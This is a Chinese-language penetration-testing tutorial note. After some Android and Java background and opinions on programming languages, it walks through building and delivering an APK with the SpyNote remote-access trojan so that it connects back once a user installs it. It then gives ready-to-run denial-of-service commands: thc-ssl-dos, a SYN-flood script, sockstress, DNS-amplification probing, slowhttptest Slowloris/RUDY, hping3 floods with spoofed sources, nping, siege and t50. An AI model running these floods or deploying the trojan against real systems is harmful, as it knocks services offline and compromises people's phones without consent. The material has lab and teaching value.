# 渗透测试基础16

# 认识手机木马以及移动安全（关于Android、关于java、android木马、DOS拒绝服务攻击-kali实验基础、ssl-dos、syn flood、sockstress、dns放大攻击、慢速攻击、hping3攻击、siege攻击、t50压力测试）

## android

基于linux

开发语言java

应用广泛：
什么地方都有java虚拟机

但是：

java->臃肿->java虚拟机->c语言->机器语言->操作系统

苹果：

oc/swift->机器语言->操纵系统



## 关于java

网站：

java web

jsp+linux+mysql/oracle/db2+tomcat

实际上更好用的：

php+linux+nginx+mysql



jvm pc：

java=>jar程序

但是：

kotlin(简单！！！)=>jar程序

c#(c++++难度不高，用户多)/python（超级简单）都很牛逼

Golang(c的精确度，python的快速开发，几乎啥事都能做)



java android：

java + c(编写.so=windows的dll文件)=>android

或者：

kotlin(像python，写代码非常快)+c => android



## 一些相关问题

纠结什么语言有前途？

主要看：这个语言后台的大佬有没有钱投入？

c/c++ 不可能落寞!!!全球都支持它
java 靠oracle公司支持，老旧设备
kotlin 谷歌+Intellj
oc/swift 苹果公司
php 基金会，全球90%的网站都在使用
python 基金会，小部分人工智能开发/快速开发的公司
go 谷歌，区块链开发公司
c++/c#/vb 微软公司



## android木马:

以云盘的：Last_Version为例，木马名字为SpyNote.exe

并安装：

![image-20220111154222265](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111154222265.png)

java环境

安装后，打开SpyNote.exe主控端：

![image-20220111154539140](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111154539140.png)



大多数情况，木马只需要具备：
上线，文件控制，提权（可有可无），命令执行

如果想学android开发：
不要太在意自己学的是不是java，因为android上的编程，相当于一门长得很像java的java语言



然后设置：

![image-20220111154736842](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111154736842.png)

![image-20220111154808544](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111154808544.png)

也可以设置一些功能：

![image-20220111154858453](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111154858453.png)

简单测试一下：Build，把木马相关写入相应apk文件里：

![image-20220111155022994](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111155022994.png)

确保电脑的3210端口打开在监听状态。

然后连接手机：

```
ftp://192.168.1.202:2221
```

![image-20220111155157025](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111155157025.png)

把木马apk文件发送到手机文件里：

![image-20220111155241421](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111155241421.png)

然后用户安装了app后，打开之后，电脑端木马就上线了。

然后就可以做很多事情了。



## DOS拒绝服务攻击

## DDOS分布式拒绝服务攻击

tcp三次握手

目前这种攻击无解
一般大佬的防御（用钱）



## 实验进行DOS攻击

### kali的更新源设置为阿里云的：

目录/etc/apt/source.list，下载到本机

```
deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib

# 如下图：
```

![image-20220111160404450](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111160404450.png)

设置完成后再把文件放回kali里

然后在kali命令行：

```
apt-get update    # 更新

apt-get install thc-ssl-dos    # 安装软件
```



### 类似kali的安全审计系统——功能和隐蔽性较好

https://www.parrotsec.org/

![image-20220111160229567](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111160229567.png)

需要安装。



如果想直接导入虚拟机，不想安装，可以：

![image-20220111160706009](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111160706009.png)



用live模式打开parrot：

用bitvise连接。

```
uname -a  # 查看相关
```



## DOS:

#### **ssl-dos**:

服务器每次会处理300次/s的ssl请求
这种攻击方法和传统攻击不一样，使用普通带宽也可以考虑打30G带宽的服务器

`apt-get install thc-ssl-dos`安装

目标是打击https的网站：

```
thc-ssl-dos [目标ip] [目标ssl端口:443] --accept
```



#### syn flood:

syn洪水攻击

```
先安装：
apt install python-scapy
apt install python3-scapy
```

```
从gethub上下载：
git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
cd Python-SYN-Flood-Attack-Tool
```

```
ls
ls -la
chmod 777 ./*
# 更改执行权限
```

```
用Python去运行：
python3 py3_synflood_cmd.py -t [目标ip：10.20.30.40] -p 8080 -c 5
python3 py3_SYN-Flood.py
python SYN-Flood.py
```

![image-20220111163648410](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111163648410.png)



#### sockstress:

云盘里可以下载。

![image-20220111163805588](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111163805588.png)

![image-20220111163825703](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111163825703.png)



针对tcp服务，耗尽目标资源，建立大量的sock连接，不消耗网络资源
完成tcp3次握手，最后ack大小为0（即客户端不接收数据）
攻击者损耗很小
异步攻击，所以一台设备可以造成很大的效果
windows窗口实现流控（流量控制）

需要python2环境并且安装scapy

```
./sockstress.py [目标ip] [端口号] [线程]
```



#### dns放大攻击:

发送给dns的数据包94
返回的数据包大小160+

典型的流量放大攻击
单机带宽优势，以小汇多
利用协议的特性放大流量

```
apt-get install dnsutils
# 安装dig命令

dig ANY qq.com @[dns的ip]
dig ANY [目标域名（外网）] @[dns的服务器地址ip]
# 利用回包判断dns服务器是否会被利用
```

![image-20220111164722176](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220111164722176.png)



#### 慢速攻击(打击网站有效果):

```
apt-get install openssl
apt-get install libssl-dev
apt-get install slowhttptest
```



**slowhttptest**软件原理：
低带宽应用层慢速DOS攻击（相对于cc慢）
擅长攻击apache tomcat...服务器

**Slowloris,slow http post**攻击
耗尽应用并发的连接池，类似于http层的**syn_flood**
http协议**默认**在服务端全部接收到请求之后才开始处理，如果客户发送的数据包慢速而且不完整，就会导致Dos

**Slowloris攻击**:完整的http结尾是\r\n\r\n，它的攻击结尾\r\n
**slow http post**攻击:http头部content-length声明长度，但是body缓慢发送

**slow http post**慢速攻击(**RUDY**):

```
slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.214 -x 10 -p 3

# -c 并发连接数
# -H 默认攻击
# -B http的post攻击、rudy攻击
# -R 耗尽对方内存
# -X 慢速读取
# -o 把结果状态输出成一个文件
# -i 中间停留时间
# -l 持续攻击时间
# -r 每秒建立连接数
# -s 头部长度
# -t 请求方式
# -u URL
# -f 需要什么样的头
# -p 默认几秒没相应即判定已死亡
```

**Slowloris**攻击：

```
slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -t GET -u http://192.168.1.214 -x 24 -p 3
```



### hping3:

定制发送任何的数据包

```
-a   #伪造源地址
-q   #不返回
-n   #不解析域名
-s   #源端口
-d   #字节数
-p   #端口
--flood   #以flood方式攻击
```



syn-flood

```
hping3 -c 3000 -d 120 -S -w 64 -p 80 --flood --rand-source [目标ip]
hping3 -S -P -p 80 --flood --rand-source [目标ip]
```



tcp-flood

```
hping3 -SARUFP -p 80 --flood --rand-source [目标ip]
```



icmp-flood

```
hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip]
```



udp-flood

```
hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip]
```



LAND
特殊的syn-flood攻击
源地址和目的地址都是受害者，自己和自己完成3次握手

```
hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip]
```



TCP全链接DOS攻击

```
nping --tcp-connect --rate=10000 -c 10000000 -q [目标ip]
```



### siege攻击：

```
siege -i -c 1000000 [目标ip] -A httttttp
```



### t50压力测试：

网络协议支持全面

```
t50 -h    #可以查看参数

t50 [目标网关] --flood --turbo -S --protocol TCP --dport 22

t50 --flood --protocol TCP [目标ip] --dport 80
```



